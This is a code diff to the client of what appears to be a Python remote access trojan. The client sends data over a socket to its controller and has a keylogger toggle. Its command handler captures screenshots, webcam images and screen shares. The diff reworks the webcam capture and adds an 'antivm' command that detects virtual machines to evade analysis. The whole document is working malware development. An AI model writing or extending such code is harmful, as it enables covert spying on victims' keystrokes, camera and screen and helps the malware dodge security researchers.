@@ -20,10 +20,7 @@ class CLIENT:
             if isinstance(tosend, str):
                 tosend = tosend.encode('utf-8')
             self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
-
-
-
-
+    
     def turn_keylogger(self, status):
         if HAVE_X:
             def on_press(key):
@@ -96,14 +93,19 @@ class CLIENT:
             # print("Executing Screenshot: " + data[1])
             screenshot = SCREENSHOT()
             self.send_data(screenshot.get_data(), encode=False)
+    
         elif data[0] == "webcam":
-            # print("Executing Webcam: " + data[1])
-            webcam = Webcam()
-            self.send_data(webcam.SC_DATA, encode=False)
+            webcam = WEBCAM()
+            self.send_data(webcam.get_data(), encode=False)
+
         elif data[0] == "screenshare":
             # print("Executing Screenshare: " + data[1])
             screenshare = Screenshare()
             self.send_data(screenshare.get_data(), encode=False)
+        elif data[0] == "antivm":
+            # print("Executing Antivm: " + data[1])
+            antivm = AntiVM()
+            self.send_data(antivm.get_data() , encode=False)
         else:
             print(f"[!] Unknown command: {data[0]}")
             self.send_data(f"Unknown command: {data[0]}".encode('utf-8'))
